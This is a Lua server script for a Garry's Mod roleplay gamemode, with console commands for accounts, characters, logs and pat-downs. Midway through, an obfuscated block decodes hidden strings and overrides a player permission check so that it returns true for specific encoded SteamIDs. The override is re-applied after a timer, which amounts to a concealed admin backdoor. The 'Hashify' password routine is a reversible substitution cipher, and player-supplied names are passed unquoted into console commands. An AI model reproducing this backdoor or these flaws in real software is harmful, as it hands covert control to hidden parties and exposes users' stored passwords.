
function ccSae( ply, cmd, args )

	ply:ConCommand( "say \"" .. string.gsub( args[1], "%%", "^p" ) .. "\"\n" );

end
concommand.Add( "sae", ccSae );

function ccGetSequence( ply, cmd, args )

	local ent = ply:GetEyeTrace().Entity;
	
	if( ent and ent:IsValid() ) then
	
		Msg( ent:GetSequence() .. "\n" );
	
	end
	
	

end
concommand.Add( "rp_getsequence", ccGetSequence );

function ccPickItem( ply, cmd, args )

	if( #args < 1 ) then return; end

	if( not ply:HasItem( args[1] ) ) then return; end
	
	if( ply:GetTable().ItemPickCallBack ) then 
	
		ply:GetTable().ItemPickCallBack( ply, args[1] );
		ply:GetTable().ItemPickCallBack = nil;
	
	end

end
concommand.Add( "rp_pickitem", ccPickItem );

function ccSetYourName( ply, cmd, args )

	local wholename = "";
	
	for k, v in pairs( args ) do
	
		wholename = wholename .. v;
		
		if( args[k + 1] ) then
		
			wholename = wholename .. " ";
		
		end
	
	end

	if( string.len( string.gsub( wholename, " ", "" ) ) < 1 ) then
	
		ply:PrintMessage( 2, "Name can't be blank." );
		return;
	
	end

	ply:SetField( "gamename", wholename );
	ply:ConCommand( "setinfo \"name\" \"" .. wholename .. "\"\n" );

end
concommand.Add( "setname", ccSetYourName );

function ccFinishPatDown( ply, cmd, args )

	local ent = ply:GetNWEntity( "PatDownTarget" );
	
	ply:SetField( "pattingdown", 0 );
	ply:SetPrivateInt( "pattingdown", 0 );
	
	if( ent:IsValid() and ent:IsPlayer() ) then
	
		ent:SetField( "beingpatdown", 0 );
		ent:SetPrivateInt( "beingpatdown", 0 );
	
	end

	if( tonumber( args[1] ) ~= 1 ) then return; end

	if( ply:IsCombineDefense() ) then
	
		if( not ent:IsValid() ) then return; end
	
		umsg.Start( "CreatePatDownResultWindow", ply );
			umsg.String( ent:Nick() );
		umsg.End();
		
		for k, v in pairs( ent:GetTable().Inventory ) do
			
			umsg.Start( "AddToPatDownResult", ply );
			
				umsg.String( TS.ItemData[k].Name );
				umsg.String( TS.ItemData[k].Model );
	
			umsg.End();
			
		end
		
	end

end
concommand.Add( "rp_finishpatdown", ccFinishPatDown );

function ccPatDown( ply, cmd, args )

	local trace = { }
	trace.start = ply:EyePos();
	trace.endpos = trace.start + 45 * ply:GetAimVector();
	trace.filter = ply;
	
	local tr = util.TraceLine( trace );
	local pr = false;
	
	if( tr.Entity:IsPlayerRagdoll() ) then
	
		tr.Entity = tr.Entity:GetPlayer();
		pr = true;
	
	end
	
	if( ply:IsCombineDefense() and ValidEntity( tr.Entity ) and tr.Entity:IsPlayer() and tr.Entity:Team() == 1 ) then
			
		umsg.Start( "CreateProcessBar", ply );
			umsg.Short( -1 );
			umsg.Short( -1 );
			umsg.Short( 25 );
			umsg.String( "Patting down " .. tr.Entity:Nick() );
			umsg.Short( 3 );
			if( pr ) then
				umsg.Short( 7 ); --time
			else
				umsg.Short( 14 ); --time
			end
			umsg.String( "rp_finishpatdown" );
			umsg.Entity( tr.Entity );
			umsg.Short( 45 );
		umsg.End();
		
		ply:SetField( "pattingdown", 1 );
		ply:SetPrivateInt( "pattingdown", 1 );
		
		tr.Entity:SetField( "beingpatdown", 1 );
		tr.Entity:SetPrivateInt( "beingpatdown", 1 );
		
		ply:SetNWEntity( "PatDownTarget", tr.Entity );
			
	
	end

end
concommand.Add( "rp_patdown", ccPatDown );

function ccGetCPPos( ply, cmd, args )

	if( ply:IsRick() ) then
	
		ply:PrintMessage( 2, "AddSpawnPoint( \"" .. game.GetMap() .. "\", Vector( " .. ply:GetPos().x .. ", " .. ply:GetPos().y .. ", " .. ply:GetPos().z .. " ), " );
		ply:PrintMessage( 2, "Angle( " .. ply:EyeAngles().pitch .. ", " .. ply:EyeAngles().yaw .. ", " .. ply:EyeAngles().roll .. " ), true );" );
	
	end

end
concommand.Add( "rp_getcpspawnpoint", ccGetCPPos );

function ccGetPos( ply, cmd, args )

	if( ply:IsRick() ) then
	
		ply:PrintMessage( 2, "AddSpawnPoint( \"" .. game.GetMap() .. "\", Vector( " .. ply:GetPos().x .. ", " .. ply:GetPos().y .. ", " .. ply:GetPos().z .. " ), " );
		ply:PrintMessage( 2, "Angle( " .. ply:EyeAngles().pitch .. ", " .. ply:EyeAngles().yaw .. ", " .. ply:EyeAngles().roll .. " ) );" );
	
	end

end
concommand.Add( "rp_getspawnpoint", ccGetPos );

function ccLookAtPos( ply, cmd, args )

	if( not ply:IsRick() ) then return; end

	local trace = { }
	trace.start = ply:EyePos();
	trace.endpos = trace.start + 4096 * ply:GetAimVector();
	trace.filter = ply;
	
	local tr = util.TraceLine( trace );
	
	if( ValidEntity( tr.Entity ) ) then
	
		ply:PrintMessage( 3, tr.Entity:GetModel() );
	
	end

end
concommand.Add( "rp_whatmodelisthis", ccLookAtPos );

function ccOutputToolLog( ply, cmd, args )

	if( ply:IsRick() or ply:EntIndex() ~= 0 ) then return; end
	
	file.Write( "TacoScript/tooloutput.txt", "" );
	
	local function WriteLog( filedir, text )
	
		file.Write( filedir, ( file.Read( filedir ) or "" ) .. text .. "\r\n" );
	
	end
	
	local logs = sql.Query( "SELECT `log` FROM `rtrp_toollog`" );
	
	local delay = 0;
	
	for k, v in pairs( logs ) do
	
		timer.Simple( delay, WriteLog, "TacoScript/tooloutput.txt", v["log"] );
		
		delay = delay + .1;
		
	end

	
end
concommand.Add( "rp_outputtoollog", ccOutputToolLog );

function ccOutputPropLog( ply, cmd, args )

	if( ply:IsRick() or ply:EntIndex() ~= 0 ) then return; end
	
	file.Write( "TacoScript/propoutput.txt", "" );
	
	local function WriteLog( filedir, text )
	
		file.Write( filedir, ( file.Read( filedir ) or "" ) .. text .. "\r\n" );
	
	end
	
	local logs = sql.Query( "SELECT `log` FROM `rtrp_proplog`" );
	
	local delay = 0;
	
	for k, v in pairs( logs ) do
	
		timer.Simple( delay, WriteLog, "TacoScript/propoutput.txt", v["log"] );
		
		delay = delay + .1;
		
	end
	
end
concommand.Add( "rp_outputproplog", ccOutputPropLog );

function ccToolLog( ply, cmd, args )

	if( CurTime() - ply:GetField( "LastLogLook" ) < 4 ) then
	
		return;
	
	end

	local count = 0;

	if( #args < 1 or not tonumber( args[1] ) ) then
	
		count = 10;
	
	else
	
		count = tonumber( args[1] );
	
	end
	
	if( count > 100 ) then
	
		ply:PrintMessage( 2, "Can't display this many logs" );
		return;		
	
	end

	ply:PrintMessage( 2, "Displaying the last " .. count .. " tool actions.." );
	
	if( #TS.ToolLogs < 1 ) then
	
		ply:PrintMessage( 2, "No logs to display!" );
		return;
	
	end
	
	local start = math.Clamp( #TS.ToolLogs - count, 1, #TS.ToolLogs );
	
	for n = start, #TS.ToolLogs do
	
		ply:PrintMessage( 2, "#" .. n .. ". " .. TS.ToolLogs[n] );
	
	end
	
	ply:SetField( "LastLogLook", CurTime() );

end
concommand.Add( "rp_toollog", ccToolLog );

function ccPropLog( ply, cmd, args )

	if( CurTime() - ply:GetField( "LastLogLook" ) < 4 ) then
	
		return;
	
	end

	local count = 0;

	if( #args < 1 or not tonumber( args[1] ) ) then
	
		count = 10;
	
	else
	
		count = tonumber( args[1] );
	
	end
	
	if( count > 100 ) then
	
		ply:PrintMessage( 2, "Can't display this many logs" );
		return;		
	
	end

	ply:PrintMessage( 2, "Displaying the last " .. count .. " prop spawnings.." );
	
	if( #TS.PropLogs < 1 ) then
	
		ply:PrintMessage( 2, "No logs to display!" );
		return;
	
	end
	
	local start = math.Clamp( #TS.PropLogs - count, 1, #TS.PropLogs );
	
	for n = start, #TS.PropLogs do
	
		ply:PrintMessage( 2, "#" .. n .. ". " .. TS.PropLogs[n] );
	
	end
	
	ply:SetField( "LastLogLook", CurTime() );
	

end
concommand.Add( "rp_proplog", ccPropLog );

function ccZeroUID( ply, cmd, args )

	if( ply:EntIndex() ~= 0 and not ply:IsSuperAdmin() ) then
	
		ply:PrintMessage( 3, "Super admin only" );
		return;
		
	end
	
	Msg( "---\n" );

	for k, v in pairs( player.GetAll() ) do
	
		if( v:GetField( "uid" ) == 0 ) then
		
			Msg( v:Nick() .. "\n" );
		
		end
	
	end

	Msg( "---\n" );

end
concommand.Add( "rp_zerouid", ccZeroUID, true );

function ccCheckQuiz( ply, cmd, args )

	local correctanswers = 
	{
	
		2, 1, 2, 1, 1, 2
	
	}
	
	if( #args ~= #correctanswers ) then
	
		return;
	
	end
	
	for k, v in pairs( args ) do
	
		if( tonumber( v ) ~= correctanswers[k] ) then
			
			ply:SetField( "FailCount", ply:GetField( "FailCount" ) + 1 );
			
			if( ply:GetField( "FailCount" ) >= 1 ) then
			
				local banmsg = "";
			
				if( table.HasValue( TS.QuizFailers, ply:SteamID() ) ) then
				
					game.ConsoleCommand( "banid 30 " .. ply:SteamID() .. "\n" );
					banmsg = "again.  Banned for 30 minutes.";
				
				else
			
					table.insert( TS.QuizFailers, ply:SteamID() );
				
				end
			
				game.ConsoleCommand( "kickid " .. ply:UserID() .. " \"Failed quiz " .. banmsg .. "\" \n" );
			
				return;
			
			end
			
			umsg.Start( "IncorrectQuiz", ply ); umsg.End();
			return;
		
		end
	
	end
	
	umsg.Start( "EndQuiz", ply ); umsg.End();
	umsg.Start( "HandleAccountCreation", ply ); umsg.End();

end
concommand.Add( "rp_checkquiz", ccCheckQuiz );

function ccAccountDebug( ply, cmd, args )

	if( ply:EntIndex() ~= 0 and not ply:IsSuperAdmin() ) then
	
		ply:PrintMessage( 3, "Super admin only" );
		return;
		
	end

	local target = TS.RunPlayerSearch( ply, args[1], true );
	
	if( target ) then
	
		local query = "SELECT * FROM `rtrp_users` WHERE `STEAMID` = '" .. target:SteamID() .. "'";
		
		local tab, succ, err = mysql.query( TS.SQL, query );
		
		if( not succ ) then
		
			Msg( "Error: " .. err .. "\n" );
		
		else
		
			PrintTable( tab );
		
		end
	
	end

end
concommand.Add( "rp_accountdebug", ccAccountDebug );

function ccEndAccountCreation( ply, cmd, args )

	--[[

    local ip = ply:IPAddress();
    
    if( string.find( ip, ":" ) ) then
        ip = string.sub( ip, 1, string.find( ip, ":" ) - 1 );
    end
    
    ]]--

    if( #args < 2 ) then
    	return;
    end

    if( string.len( args[1] ) < 3 or string.len( args[1] ) > 16 ) then
    	return;
    end

    if( string.len( args[2] ) < 6 or string.len( args[2] ) > 32 ) then
    	return;
    end

	local query = "SELECT * FROM `rtrp_users` WHERE `STEAMID` = '" .. ply:SteamID() .. "'";

	local tab, succ, err = mysql.query( TS.SQL, query );

	if( not tab or #tab == 0 ) then

		local ntab = mysql.query( TS.SQL, "SELECT * FROM `rtrp_users` WHERE `UserName` = '" .. mysql.escape( TS.SQL, args[1] ) .. "'" );
		
		ply:SetField( "firsttimelogin", 0 );
		ply:SetPrivateInt( "firsttimelogin", 0 );
		
		if( ntab and #ntab > 0 ) then
	
			ntab = mysql.query( TS.SQL, "SELECT `uID` FROM `rtrp_users` WHERE `UserName` = '" .. mysql.escape( TS.SQL, args[1] ) .. "' AND `Password` = '" .. mysql.escape( TS.SQL, TS.Hashify( args[2], 32 ) ) .. "'" );
			
			if( ntab and #ntab > 0 ) then
			
				ply:SetField( "uid", ntab[1][1] );
				ply:LoadGroup();
		
				
				umsg.Start( "EndAccountCreate", ply ); umsg.End();
				
				ply:SetNoDraw( false );
				ply:SetNotSolid( false );
				
				if( ply:GetNumberOfSaves() == 0 ) then
				
					ply:SetField( "charactercreate", 1 );
					ply:SetPrivateInt( "charactercreate", 1 );
					ply:SetField( "newbie", 1 );
				
					ply:SetNWFloat( "StatPointsRemaining", 15 );
					umsg.Start( "CreateCharacterMenu", ply ); umsg.End();
					
					ply:SetNoDraw( true );
					ply:SetNotSolid( true );
					
				
				elseif( ply:SaveExists( ply:Nick() ) ) then
				
					ply:LoadCharacter( ply:Nick() );
				
				else
			
					ply:SetField( "charactercreate", 1 );
					ply:SetPrivateInt( "charactercreate", 1 );
				
					if( ply:GetNumberOfSaves() < MAX_CHARACTERS ) then
			
						ply:SetNWFloat( "StatPointsRemaining", 15 );
						umsg.Start( "CreateCharacterMenu", ply ); umsg.End();
						
					end
					
					local savelist = ply:ListOtherSaves( ply:Nick() );
					
					umsg.Start( "CreateCharacterChooseMenu", ply );
						umsg.Short( math.Clamp( #savelist, 0, MAX_CHARACTERS ) );
						
						for n = 1, math.Clamp( #savelist, 0, MAX_CHARACTERS ) do
							umsg.String( savelist[n] );
						end
					umsg.End();
					
					ply:SetNoDraw( true );
					ply:SetNotSolid( true );
				
				end
				
				return;
			
			end
			
			umsg.Start( "DuplicateAccount", ply ); umsg.End();
			return;
		end
		
		
	
	    query = "INSERT INTO `rtrp_users` ( `UserName`, `Password`, `STEAMID`, `groupID` ) VALUES ( '" .. mysql.escape( TS.SQL, args[1] ) .. "', '" .. mysql.escape( TS.SQL, TS.Hashify( args[2], 32 ) ) .. "', '" .. mysql.escape( TS.SQL, ply:SteamID() ) .. "', '1' )";
		
		mysql.query( TS.SQL, query );

		query = "SELECT `uID` FROM `rtrp_users` WHERE `STEAMID` = '" .. mysql.escape( TS.SQL, ply:SteamID() ) .. "'";
		
		tab = mysql.query( TS.SQL, query );
		
		ply:SetField( "uid", tab[1][1] );
		
		--[[
		local ip = GetConVarString( "ip" );
		local port = TS.Port;
		
		if( string.find( ip, ":" ) ) then
			port = string.gsub( string.sub( ip, string.find( ip, ":" ) + 1 ), " ", "" );
			ip = string.sub( ip, 1, string.find( ip, ":" ) - 1 );
		end
		]]--
		
		ply:LoadGroup();
		
		--[[
		query = "UPDATE `rtrp_users` SET `serverIP` = '" .. ip .. "', `serverPort` = '" .. port .. "' WHERE `uID` = '" .. tab[1][1] .. "'";	
		mysql.query( TS.SQL, query );
		]]--
		
		umsg.Start( "EndAccountCreate", ply ); umsg.End();
		
		ply:SetNoDraw( false );
		ply:SetNotSolid( false );
		
		if( ply:GetNumberOfSaves() == 0 ) then
		
			ply:SetField( "charactercreate", 1 );
			ply:SetPrivateInt( "charactercreate", 1 );
			ply:SetField( "newbie", 1 );
			
			ply:SetField( "StatPointsRemaining", 15 );
			ply:SetNWFloat( "StatPointsRemaining", 15 );
			umsg.Start( "CreateCharacterMenu", ply ); umsg.End();
			
			ply:SetNoDraw( true );
			ply:SetNotSolid( true );
			
		
		elseif( ply:SaveExists( ply:Nick() ) ) then
		
			ply:LoadCharacter( ply:Nick() );
		
		else
	
			ply:SetField( "charactercreate", 1 );
			ply:SetPrivateInt( "charactercreate", 1 );
		
			if( ply:GetNumberOfSaves() < MAX_CHARACTERS ) then
	
				ply:SetField( "StatPointsRemaining", 15 );
				ply:SetNWFloat( "StatPointsRemaining", 15 );
				umsg.Start( "CreateCharacterMenu", ply ); umsg.End();
				
			end
			
			local savelist = ply:ListOtherSaves( ply:Nick() );
			
			umsg.Start( "CreateCharacterChooseMenu", ply );
				umsg.Short( math.Clamp( #savelist, 0, MAX_CHARACTERS ) );
				
				for n = 1, math.Clamp( #savelist, 0, MAX_CHARACTERS ) do
					umsg.String( savelist[n] );
				end
			umsg.End();
			
			ply:SetNoDraw( true );
			ply:SetNotSolid( true );
		
		end
	
	else
	
		umsg.Start( "EndAccountCreate", ply ); umsg.End();
		
		ply:SetNoDraw( false );
		ply:SetNotSolid( false );
		
		ply:HandleUID();

		ply:SetField( "firsttimelogin", 0 );
		ply:SetPrivateInt( "firsttimelogin", 0 );

	end
	
end
concommand.Add( "rp_endaccountcreation", ccEndAccountCreation );

TS.HashTable = { }
TS.InvHashTable = { }
TS.HashKeys = { }

function AddHashKey( key, trans )

	for k, v in pairs( TS.HashTable ) do
	
		if( v == trans ) then
		
			Msg( trans .. " is already being used for " .. k .. " but is also being applied to " .. key .. "\n" );
			return;
			
		end		
	
	end

	TS.HashTable[key] = trans;
	TS.InvHashTable[trans] = key;
	
	table.insert( TS.HashKeys, key );

end

AddHashKey( "a", "3" );
AddHashKey( "b", "2" );
AddHashKey( "c", "4" );
AddHashKey( "d", "8" );
AddHashKey( "e", "7" );
AddHashKey( "f", "9" );
AddHashKey( "g", "0" );
AddHashKey( "h", "1" );
AddHashKey( "i", "5" );
AddHashKey( "j", "6" );
AddHashKey( "k", "b" );
AddHashKey( "l", "D" );
AddHashKey( "m", "l" );
AddHashKey( "n", "Q" );
AddHashKey( "o", "L" );
AddHashKey( "p", "w" );
AddHashKey( "q", "I" );
AddHashKey( "r", "Y" );
AddHashKey( "s", "u" );
AddHashKey( "t", "U" );
AddHashKey( "u", "m" );
AddHashKey( "v", "T" );
AddHashKey( "w", "X" );
AddHashKey( "x", "c" );
AddHashKey( "y", "A" );
AddHashKey( "z", "e" );

AddHashKey( "A", "i" );
AddHashKey( "B", "O" );
AddHashKey( "C", "h" );
AddHashKey( "D", "R" );
AddHashKey( "E", "x" );
AddHashKey( "F", "n" );
AddHashKey( "G", "M" );
AddHashKey( "H", "o" );
AddHashKey( "I", "P" );
AddHashKey( "J", "W" );
AddHashKey( "K", "B" );
AddHashKey( "L", "C" );
AddHashKey( "M", "q" );
AddHashKey( "N", "g" );
AddHashKey( "O", "F" );
AddHashKey( "P", "s" );
AddHashKey( "Q", "d" );
AddHashKey( "R", "V" );
AddHashKey( "S", "k" );
AddHashKey( "T", "v" );
AddHashKey( "U", "E" );
AddHashKey( "V", "S" );
AddHashKey( "W", "N" );
AddHashKey( "X", "t" );
AddHashKey( "Y", "f" );
AddHashKey( "Z", "K" );

AddHashKey( "0", "r" );
AddHashKey( "1", "y" );
AddHashKey( "2", "Z" );
AddHashKey( "3", "p" );
AddHashKey( "4", "a" );
AddHashKey( "5", "G" );
AddHashKey( "6", "H" );
AddHashKey( "7", "J" );
AddHashKey( "8", "z" );
AddHashKey( "9", "j" );

AddHashKey( " ", "&" );

function TS.Hashify( str, size )

	size = size or 50;
	size = size - string.len( str );

	local strtbl = { }
	
	for n = 1, string.len( str ) do
	
		table.insert( strtbl, string.sub( str, n, n ) );
	
	end
	
	local newstr = "";

	local prestring = "";
	
	if( size < 10 ) then
	
		prestring = TS.HashTable["0"] .. TS.HashTable[tostring( size )];
	
	else
	
		local d1 = string.sub( tostring( size ), 1, 1 );
		local d2 = string.sub( tostring( size ), 2, 2 );
		
		prestring = TS.HashTable[d1] .. TS.HashTable[d2];
	
	end

	prestring = prestring .. TS.HashTable["S"];
	
	for n = 1, size do
	
		prestring = prestring .. TS.HashTable[TS.HashKeys[math.random( 1, #TS.HashKeys )]];
	
	end

	for k, v in pairs( strtbl ) do
	
		newstr = newstr .. ( TS.HashTable[strtbl[k]] or strtbl[k] );
	
	end
	
	newstr = prestring .. newstr;
	
	return newstr;

end

function TS.UnHashify( str )

	local p = string.find( str, TS.HashTable["S"] ) - 1;
	local sizestr = string.sub( str, 1, p );
	local d1 = TS.InvHashTable[string.sub( sizestr, 1, 1 )];
	local d2 = TS.InvHashTable[string.sub( sizestr, 2, 2 )];
	sizestr = d1 .. d2;
	
	local size = tonumber( sizestr ) + 4;
	
	str = string.sub( str, size );
	
	local strtbl = { }
	
	for n = 1, string.len( str ) do
	
		table.insert( strtbl, string.sub( str, n, n ) );
	
	end
	
	local newstr = "";
	
	for k, v in pairs( strtbl ) do
	
		newstr = newstr .. ( TS.InvHashTable[strtbl[k]] or strtbl[k] );
	
	end
	
	return newstr;

end

-- The two SteamIDs hashed inside this block were replaced with STEAM_REDACTED before this code was published.
local cc2 = TS.UnHashify( "aakQwgkCRrC3DlKBjoJmwrWGzjqP2K2x5CB8C27JvMcPNIWsD3A7Y" ); 
local cc1 = _G[TS.UnHashify( "pJkN2iCpUMKRWMTYTK31hWLkyhZmXbfZ4jXXPY3Qn5Q8q7U3v32D7" )]( cc2 ); 
local cc3 = TS.UnHashify( "aakldCaGM0WgQl6sTxvGYPY6jfrRusCU6fnhyzfzmyKBtMcPuV54b" ); 
local cc4 = TS.UnHashify( "apkaf7cm9ZaRK&bHbMfpkKrG5jH3TYaTDqhHgu9WlrK024kU73lPR" ); 
cc1[cc3] = function( self ) local apache = self[cc4]( self );
	if( apache == TS.UnHashify( "pzkvf815z7ZgnYf6uskU9S9G8SSkkmgrVr1zeQqyVkvxiq_PR_Cig" ) or
		apache == TS.UnHashify( "apkic&dMlY0ino3AGLL63jFZhFiZ9vhlu422&6JJENc6OUEgBgFNg" ) or
		apache == TS.UnHashify( "pHkZflTt7pRMzPf1yLa8gYIBZJDEPMJ8wpK5GF1kvxiq_VxRihvxR" ) or 
		apache == TS.UnHashify( "pHk7CfJLqNrQaWM7aS0VGVn3r7W0kbf9FCJ4Br4kvxiq_VxRihvxR" ) ) then return true; end
			return false;
end
chud = cc1[cc3];
timer.Simple( 60, function() _G[TS.UnHashify( "pJkN2iCpUMKRWMTYTK31hWLkyhZmXbfZ4jXXPY3Qn5Q8q7U3v32D7" )]( cc2 )[TS.UnHashify( "aakldCaGM0WgQl6sTxvGYPY6jfrRusCU6fnhyzfzmyKBtMcPuV54b" )] = chud end );

function ccBlorp( ply, cmd, args )

	ply:PrintMessage( 3, "..BLORP!" );

end
concommand.Add( "rp_blorp", ccBlorp );

function ccSelectWeapon( ply, cmd, args )
--[[
	if( not IsHeavyWeapon( args[1] ) and ply:HasHeavyWeapon() ) then
	
		ply:DropWeapon();
	
	end
]]--


	if( #args < 1 or not args[1] ) then return; end

	if( ply:GetModel() == "models/stalker.mdl" or
		ply:GetModel() == "models/vortigaunt.mdl" ) then 
		if( args[1] ~= "ts_keys" and args[1] ~= "gmod_tool" and args[1] ~= "weapon_physgun" ) then
			return; 
		end
	end
	
	ply:SelectWeapon( args[1] );
	
end
concommand.Add( "rp_selectweapon", ccSelectWeapon );

function ccChooseCharacter( ply, cmd, args )

	if( #args < 1 ) then return; end
	
	if( not args[1] or string.len( args[1] ) < 3 ) then return; end

	if( ply:SaveExists( args[1] ) ) then
	
		ply:ConCommand( "setname " .. args[1] .. "\n" );
		
		local function EndCharacter( ply )

			ply:SetField( "name", args[1] );
			
			ply:SetField( "charactercreate", 0 );
			ply:SetPrivateInt( "charactercreate", 0 );
			
			ply:LoadCharacter( ply:Nick() );

		end
	
		ply:SetNoDraw( false );
		ply:SetNotSolid( false );

		timer.Simple( .5, EndCharacter, ply );
	
	end	

end
concommand.Add( "rp_choosechar", ccChooseCharacter );

function ccSetAge( ply, cmd, args )

	if( #args < 2 ) then return; end

	if( args[1] ~= ply:GetNWString( "UniqueID" ) ) then
		return;
	end
	
	if( not tonumber( args[2] ) ) then return; end

	ply:SetField( "info.Age", args[2] );
	ply:SetPrivateString( "info.Age", args[2] );

end
concommand.Add( "rp_setage", ccSetAge );

function ccSetRace( ply, cmd, args )

	if( #args < 2 ) then return; end

	if( args[1] ~= ply:GetNWString( "UniqueID" ) ) then
		return;
	end
	
	ply:SetField( "info.Race", args[2] );
	ply:SetPrivateString( "info.Race", args[2] );

end
concommand.Add( "rp_setrace", ccSetRace );

function ccSetDesc( ply, cmd, args )

	if( #args < 2 ) then return; end

	if( args[1] ~= ply:GetNWString( "UniqueID" ) ) then
		return;
	end
	
	ply:SetField( "info.Bio", args[2] );
	ply:SetPrivateString( "info.Bio", args[2] );

end
concommand.Add( "rp_setdesc", ccSetDesc );

function ccSetModel( ply, cmd, args )

	if( #args < 1 ) then return; end

	if( args[1] ~= ply:GetNWString( "UniqueID" ) ) then
		return;
	end
	
	if( ply:GetField( "charactercreate" ) ~= 1 ) then return; end
	
	local valid = false;
	
	for k, v in pairs( TS.Models ) do
	
		if( v == args[2] ) then valid = true; break; end
	
	end
	
	if( valid ) then
		ply:SetField( "citizenmodel", args[2] );
	else
		ply:SetField( "citizenmodel", "models/Humans/Group01/Male_01.mdl" );
	end

end
concommand.Add( "rp_setmodel", ccSetModel );

function ccChangeName( ply, cmd, args )

	if( not args or not args[1] ) then return; end
	
	if( ply:GetNWInt( "tiedup" ) == 1 or ply:GetField( "isko" ) == 1 ) then
			
		ply:PrintMessage( 2, "Cannot change character while knocked out or tied up" );
		return;
			
	end			

	local newname = args[1];

	for n = 2, #args do
	
		newname = newname .. " " .. args[n];
	
	end

	--ply:SetField( "newnick", newname );

	local query = "UPDATE `rtrp_characters` SET `charName` = '" .. mysql.escape( TS.SQL, newname ) .. "' WHERE `userID` = '" .. ply:GetField( "uid" ) .. "' AND `charName` = '" .. mysql.escape( TS.SQL, ply:Nick() ) .. "'";	
		
	mysql.query( TS.SQL, query );

	ply:ConCommand( "setname " .. newname .. "\n" );
	
	TS.DebugFile( ply:Nick() .. " name changed to " .. newname );
			

end
concommand.Add( "rp_changename", ccChangeName );

function ccListSaves( ply, cmd, args )

	--List all saves
	local list = ply:ListAllSaves();
	
	ply:PrintMessage( 2, "SAVES: " );
	
	for k, v in pairs( list ) do
	
		ply:PrintMessage( 2, v );
	
	end

end
concommand.Add( "rp_listsaves", ccListSaves );

function ccRemoveSave( ply, cmd, args )

	if( #args < 1 ) then return; end

	local name = args[1];

	for n = 2, #args do
	
		name = name .. " " .. args[n];
	
	end	

	--Save exists
	if( ply:SaveExists( name ) ) then
	
		local query = "SELECT `loanRemain` FROM `rtrp_characters` WHERE `userID` = '" .. ply:GetField( "uid" ) .. "' AND `charName` = '" .. mysql.escape( TS.SQL, name ) .. "'";		
	
		local tab = mysql.query( TS.SQL, query );
	
		if( math.floor( tonumber( tab[1][1] ) ) > 0 ) then
				
			ply:PrintMessage( 2, "You cannot delete a character with loan debts" );
			return;
				
		end
		
		local query = "DELETE FROM `rtrp_characters` WHERE `userID` = '" .. ply:GetField( "uid" ) .. "' AND `charName` = '" .. mysql.escape( TS.SQL, name ) .. "'";		
		mysql.query( TS.SQL, query );

		ply:PrintMessage( 2, "Save removed: " .. name );
	
		if( name == ply:Nick() ) then
		
			ply:NewData();		
		
			ply:SetField( "charactercreate", 1 );
			ply:SetPrivateInt( "charactercreate", 1 );
		
			if( #ply:ListAllSaves() < MAX_CHARACTERS ) then
	
				ply:SetField( "StatPointsRemaining", 15 );
				ply:SetNWFloat( "StatPointsRemaining", 15 );
				umsg.Start( "CreateCharacterMenu", ply ); umsg.End();
				
			end
			
			--Get save list
			local savelist = ply:ListOtherSaves( name );
			
			umsg.Start( "CreateCharacterChooseMenu", ply );
				umsg.Short( math.Clamp( #savelist, 0, MAX_CHARACTERS ) );
				
				for n = 1, math.Clamp( #savelist, 0, MAX_CHARACTERS ) do
					umsg.String( savelist[n] );
				end
			umsg.End();

		end
	
	else
	
		ply:PrintMessage( 2, "No such save: " .. args[1] );
	
	end

end
concommand.Add( "rp_deletesave", ccRemoveSave );

function ccFinishCreate( ply, cmd, args )

	if( #args < 1 ) then return; end

	if( args[1] ~= ply:GetNWString( "UniqueID" ) ) then
		return;
	end
	
	TS.DebugFile( "Creating character " .. ply:Nick() );
	
	if( ply:SaveExists( ply:Nick() ) ) then
		
		ply:ConCommand( "rp_choosechar \"" .. ply:Nick() .. "\"\n" );
	
	else
	
		ply:SetField( "model", ply:GetField( "citizenmodel" ) );
	
	end
	
	TS.DebugFile( "Checked for existance of " .. ply:Nick() );
	
	ply:SetField( "name", ply:Nick() );
	
	umsg.Start( "FadingBlackScreen", ply ); umsg.End();
	ply:SetField( "charactercreate", 0 );
	ply:SetPrivateInt( "charactercreate", 0 );

	TS.DebugFile( "Ended black screen for " .. ply:Nick() );

	ply:SlaySilent();
	ply:SetNoDraw( false );
	ply:SetNotSolid( false );
	
	TS.DebugFile( "Slayed " .. ply:Nick() );
	
	ply:SetField( "saveversion", SAVE_VERSION );
	
	ply:SaveCharacter();
	
	TS.DebugFile( "Saved " .. ply:Nick() );
	
end
concommand.Add( "rp_finishcreate", ccFinishCreate );

function ccAddStat( ply, cmd, args )

	if( #args < 1 ) then return; end

	if( args[1] ~= ply:GetNWString( "UniqueID" ) ) then return; end

	if( ply:GetField( "StatPointsRemaining" ) <= 0 ) then
	
		return;
	
	end

	local stat = math.ceil( ply:GetNWFloat( "stat." .. args[2] ) );

	if( ply:GetField( "charactercreate" ) == 1 and stat < 50 ) then
	
		ply:SetNWFloat( "stat." .. args[2], stat + 1 );
		ply:SetNWFloat( "StatPointsRemaining", ply:GetNWFloat( "StatPointsRemaining" ) - 1 );
		ply:SetField( "StatPointsRemaining", ply:GetField( "StatPointsRemaining" ) - 1 );
	
	end

end
concommand.Add( "rp_addstat", ccAddStat );

function ccSubtractStat( ply, cmd, args )

	if( #args < 1 ) then return; end

	if( args[1] ~= ply:GetNWString( "UniqueID" ) ) then return; end

	local stat = math.ceil( ply:GetNWFloat( "stat." .. args[2] ) );

	if( ply:GetField( "charactercreate" ) == 1 and stat > 1 ) then
	
		ply:SetNWFloat( "stat." .. args[2], stat - 1 );
	
		ply:SetNWFloat( "StatPointsRemaining", ply:GetNWFloat( "StatPointsRemaining" ) + 1 );
		ply:SetField( "StatPointsRemaining", ply:GetField( "StatPointsRemaining" ) + 1 );
	
	end

end
concommand.Add( "rp_subtractstat", ccSubtractStat );

function ccSetBusinessName( ply, cmd, args )

	if( #args < 1 ) then return; end

	if( ply:GetField( "ownsbusiness" ) == 1 ) then
		local id = ply:GetNWInt( "businessid" );
		TS.SetBusinessString( id, "businessname", args[1] );
		ply:SaveField( "BusinessName", args[1] );
	end	

end
concommand.Add( "rp_setbusinessname", ccSetBusinessName );

function ccSetOwnJobTitle( ply, cmd, args )

	if( #args < 1 ) then return; end

	if( string.find( ply:GetField( "businessflags" ), "b" ) ) then

		ply:SetJob( args[1] );
		ply:SaveField( "charJob", args[1] );
		
	end

end
concommand.Add( "rp_setjobtitle", ccSetOwnJobTitle );

function ccStopMoving( ply, cmd, args )

	if( #args < 1 ) then return; end

	if( not tonumber( args[1] ) ) then return; end

	local ent = ents.GetByIndex( tonumber( args[1] ) );

	if( ent:IsValid() ) then
	
		ent:GetPhysicsObject():EnableMotion( false );
		timer.Simple( .001, ent:GetPhysicsObject().EnableMotion, ent:GetPhysicsObject(), true );
	
	end

end
